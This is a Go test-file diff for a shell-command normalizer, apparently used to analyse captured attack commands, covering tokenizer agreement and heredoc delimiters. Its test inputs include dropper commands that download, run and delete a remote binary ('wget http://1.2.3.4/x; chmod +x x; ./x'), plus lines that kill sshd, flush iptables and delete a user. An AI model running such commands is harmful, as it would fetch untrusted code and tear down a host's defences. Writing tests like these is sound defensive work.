@@ -2,12 +2,39 @@ package script
 
 import (
 	"reflect"
+	"regexp"
 	"strings"
 	"testing"
 	"unicode/utf8"
 )
 
 func norm(s string) string { return strings.Join(NormalizeCommand(s), " ") }
+
+// tokenRe specifies the scanner's tokens: the scanner is a hand-written,
+// resumable form of this expression (a heredoc body is cut out by source
+// lines and tokenising resumes after it), and the fuzz target checks that
+// the two agree on every input.
+var tokenRe = regexp.MustCompile(`<<<|<<-?|\d*(?:>>?|<)&(?:\d+|-)?|&>>?|\d+>>?|\n|\|\||&&|>>|[;|&<>()]|"[^"]*"|'[^']*'|[^\s;|&<>()]+`)
+
+func scanAll(s string) []string {
+	var out []string
+	sc := scanner{s: s}
+	for sc.next(); sc.ok(); sc.next() {
+		out = append(out, sc.tok)
+	}
+	return out
+}
+
+func TestScannerMatchesTokenRe(t *testing.T) {
+	for _, s := range []string{
+		"", " ", "a", `2>&1 &>>x >>& 3>> 1<&- <&3 >&`, "echo \"a b\" 'c;d' \"open", "x'y 'z", "a\vb\tc\fd\re\nf",
+		"<<<x <<-y <<z < > >> || && | & ; ( ) 12abc 3>f 4<f", "\xff\x00\"\xfe\"", `$(a) $((1+2)) "a\"b"`,
+	} {
+		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
+			t.Errorf("scan(%q)\n got %q\nwant %q", s, got, want)
+		}
+	}
+}
 
 func TestNormalizeCommandGolden(t *testing.T) {
 	for _, tc := range []struct{ in, want string }{
@@ -105,6 +132,9 @@ func FuzzNormalizeCommand(f *testing.F) {
 		f.Add(s)
 	}
 	f.Fuzz(func(t *testing.T, s string) {
+		if got, want := scanAll(s), tokenRe.FindAllString(s, -1); !reflect.DeepEqual(got, want) {
+			t.Fatalf("scanner disagrees with tokenRe on %q:\n got %q\nwant %q", s, got, want)
+		}
 		line := EncodeLine(s)
 		enc := Join([]string{line})
 		if line != "" && !reflect.DeepEqual(Split(enc), [][]string{NormalizeCommand(s)}) {
@@ -421,5 +451,50 @@ func TestFdRedirectionTokens(t *testing.T) {
 		if n := CommandCount([][]string{got}); n != tc.cmds {
 			t.Errorf("CommandCount(%q) = %d, want %d", tc.in, n, tc.cmds)
 		}
+	}
+}
+
+// A quoted or escaped heredoc delimiter ends on the plain delimiter line,
+// as bash's quote removal makes it: `<<\EOF` used to wait for a `\EOF` line
+// that never came, so every later command in the event was hidden and two
+// different droppers behind the same wrapper collided (audit I1).
+func TestHeredocQuotedDelimiters(t *testing.T) {
+	const tail = "\ncd /tmp; wget http://1.2.3.4/x; chmod +x x; ./x; rm -rf x"
+	want := norm("cat <<'EOF' > /tmp/a.sh\nbody\nEOF" + tail)
+	if !strings.HasSuffix(want, "; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm -rf x") {
+		t.Fatalf("baseline %q lost its tail", want)
+	}
+	for _, d := range []string{`\EOF`, `E"OF"`, `"EO"F`, `'E'\O"F"`, `"EOF"`} {
+		in := "cat <<" + d + " > /tmp/a.sh\nbody\nEOF" + tail
+		if got := norm(in); got != want {
+			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", in, got, want)
+		}
+	}
+	// A delimiter with spaces ends on the line holding exactly those words.
+	in := "cat <<\"E O F\" > /tmp/a.sh\nbody\nE O F" + tail
+	if got := norm(in); !strings.HasSuffix(got, "; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm -rf x") {
+		t.Errorf("NormalizeCommand(%q) = %q, lost the commands after the body", in, got)
+	}
+	a := EncodeLine("cat <<\\EOF >/tmp/a\nhi\nEOF\nwget http://1.1.1.1/x; chmod +x x; ./x")
+	b := EncodeLine("cat <<\\EOF >/tmp/a\nhi\nEOF\npkill -9 sshd; iptables -F; userdel admin")
+	if a == b {
+		t.Error("different commands after an escaped-delimiter heredoc collided")
+	}
+	// The terminator is a whole source line: indented, it does not end the
+	// body (bash compares the line), except tabs under <<-; a trailing \r is
+	// tolerated.
+	for _, tc := range []struct{ in, want string }{
+		{"cat <<EOF\n  EOF\nid\nEOF\nwhoami", "whoami"},
+		{"cat <<-EOF\n\t\tEOF\nwhoami", "whoami"},
+		{"cat <<EOF\nEOF\r\nwhoami", "whoami"},
+	} {
+		got := NormalizeCommand(tc.in)
+		if CommandCount([][]string{got}) != 2 || got[len(got)-1] != tc.want {
+			t.Errorf("NormalizeCommand(%q) = %q", tc.in, got)
+		}
+	}
+	// Two heredocs on one line: their bodies follow in order.
+	if got := norm("cat <<A <<B\na\nA\nb\nB\nwhoami"); !strings.HasSuffix(got, "; whoami") || CommandCount([][]string{NormalizeCommand("cat <<A <<B\na\nA\nb\nB\nwhoami")}) != 2 {
+		t.Errorf("two heredocs: %q", got)
 	}
 }
